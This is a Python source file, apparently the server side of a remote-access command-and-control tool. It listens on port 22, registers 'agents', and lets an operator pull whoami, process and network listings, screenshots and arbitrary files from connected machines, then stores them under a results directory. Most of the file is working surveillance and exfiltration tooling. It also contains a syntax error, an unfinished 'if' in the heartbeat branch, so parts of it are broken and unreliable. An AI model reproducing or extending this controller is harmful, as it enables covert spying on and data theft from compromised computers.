import socket
from threading import Thread
import json
import os
import base64
import time
from protocol import create_task,generate_task_id,send_message,recv_message,create_ping
from db import init_db,check_auth,add_agent_db,get_agent_id
connected_agents={}

def show_connected_agents():
    connected = list(connected_agents.keys())
    if not connected:
        print("No agents currently connected.")
        return
    print("Connected agents:")
    for agent in connected:
        print(f" - {agent}")
def save_task_result(agent_id, command, data_type, result_data):
    base_dir = "results"
    agent_dir = os.path.join(base_dir, f"agent_{agent_id}")

    task_dir = os.path.join(agent_dir, command)
    os.makedirs(task_dir, exist_ok=True)

    if data_type == "image":
        file_path = os.path.join(task_dir, "screenshot.png")
        with open(file_path, "wb") as f:
            f.write(base64.b64decode(result_data))
        print(f"[+] Screenshot saved for agent {agent_id} in {file_path}")

    elif data_type == "file":
        # שמירת קובץ מהסוכן
        file_path = os.path.join(task_dir, "received_file")
        with open(file_path, "wb") as f:
            f.write(base64.b64decode(result_data))
        print(f"[+] File saved for agent {agent_id} in {file_path}")

    else:  # text
        text_file = os.path.join(task_dir, "result.txt")
        with open(text_file, "w", encoding="utf-8") as f:
            try:
                decoded = base64.b64decode(result_data).decode('utf-8')
            except Exception:
                decoded = result_data
            f.write(decoded)
        print(f"[+] Text result saved for agent {agent_id} in {text_file}")
def ping_loop():
    while True: 
        if connected_agents is not None:
            for name ,info in connected_agents.items():
                try:
                    sock=info["socket"]
                    send_message(sock,create_ping())
                except:
                    info["status"]="OFFLINE"    
            time.sleep(7)

def command():
    while True:
        print("Connected agents:", list(connected_agents.keys()))        
        print("enter agent id to send commands: ")
        agent_name = input().strip().lower()
        if agent_name not in connected_agents:
            print("[x] Agent not found!")
            continue
        print("Choose a method: whoami, tasklist, netstat, getfile or scrennshot  exit to stop: ")
        command = input().strip().lower()
            
        if command == 'exit':
            print("Exiting command mode")
            break
        sock_client = connected_agents[agent_name]["socket"]

        if command == 'getfile':    
            path = input("enter the path of the file")
            command_client=create_task(generate_task_id(),command,{"path":path})  
        else:
            command_client=create_task(generate_task_id(),command)  
 
        send_message(sock_client,command_client)    #sending command to do    


        try:        # part of recv data from agent
            response = recv_message(sock_client)
            print(response)
            type = response.get("type")
            task_id = response.get("task_id")
            command_agent = response.get("command")
            status= response.get("status")
            result_data = response.get("result")

            if type == "heartbeat":
                if

            if status == 200 and type == "result":
                data_type = "text"  
                if command_agent == "screenshot":
                    data_type = "image"
                elif command_agent == "getfile":
                    data_type = "file"

                save_task_result(agent_name, command_agent, data_type, result_data)
                

                if command_agent == "whoami":
                    whoami_decoded = base64.b64decode(result_data).decode('utf-8')
                    print(f"[+] Agent {agent_name} whoami: {whoami_decoded}")

                elif command_agent == "screenshot":
                    image_bytes = base64.b64decode(result_data)
                    screenshot_file = f"screenshot_agent_{agent_name}.png"
                    with open(screenshot_file, "wb") as f:
                        f.write(image_bytes)
                    print(f"[+] Screenshot from agent {agent_name} saved to {screenshot_file}")
                elif command_agent == "getfile":
                    try:
                        file_bytes = base64.b64decode(result_data)
                        text = file_bytes.decode("utf-8")

                        with open("received.txt", "w", encoding="utf-8") as f:
                            f.write(text)

                        print("[+] TXT file saved as received.txt")

                    except Exception as e:
                        print(f"[x] Error saving file: {e}")
                else:
                    try:
                        text_result = base64.b64decode(result_data).decode('utf-8')
                        print(f"[+] Response from agent {agent_name} ({command_agent}):\n{text_result}")
                    except Exception:
                        # במקרה שהפלט הוא לא טקסט
                        print(f"[+] Response from agent {agent_name} ({command_agent}): {result_data}")
            else :
                print("error in response from agent")
        except ValueError:
            print("[x] Error: Received invalid header format.")

        except Exception as e:
            print(f"[x] Unexpected error: {e}")

def handle_request(sock_client, agent_info, addr_client):
    auth = False
    try:
        data = agent_info.get("data", {}) 
        name = data.get("name")
        password = data.get("password")
        ip = addr_client[0] 
        action = agent_info.get("action")

        if action == 'login':
            if check_auth(name, password):
                agent_id=get_agent_id(name)
                if agent_id is not None:
                    response = {"status": "success", "agent_id": agent_id}
                    response_bytes = json.dumps(response).encode()
                    header = f"{len(response_bytes):<10}".encode()
                    sock_client.sendall(header+response_bytes)
                    auth = True
                else:
                    response = {"status": "failed", "agent_id": None}
                    response_bytes = json.dumps(response).encode()
                    header = f"{len(response_bytes):<10}".encode()
                    sock_client.send(header + response_bytes)

        elif action == 'create':
            if add_agent_db(name, password, ip):
                agent_id=get_agent_id(name)
                response = {"status": "success", "agent_id": agent_id}
                response_bytes = json.dumps(response).encode()
                header = f"{len(response_bytes):<10}".encode()
                sock_client.send(header + response_bytes)
                auth = True
            else:
                response = {"status": "failed", "agent_id": None}
                response_bytes = json.dumps(response).encode()
                header = f"{len(response_bytes):<10}".encode()
                sock_client.send(header + response_bytes)
        
        if auth:#start to command
            print("success in auth")
            connected_agents[name] = {"socket":sock_client,"agend_id":agent_id,"last_seen":time.time(),"status":"ONLINE"}
            Thread(target=command,daemon=True).start()
                
    except Exception as e:
        print(f"Error handling request: {e}")
 
   
if __name__ == '__main__':
    init_db() 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('0.0.0.0', 22))
    sock.listen(5)
    print("The server is ready for agents")
    Thread(target=ping_loop,daemon=True).start()
    while True:
        sock_client, addr_client = sock.accept()
        print(f'New connection from {addr_client}')
        send_message(sock_client, {"action": "welcome", "msg": "Login or Create"})
        agent_info = recv_message(sock_client)
        
        Thread(target=handle_request, args=(sock_client, agent_info, addr_client), daemon=True).start()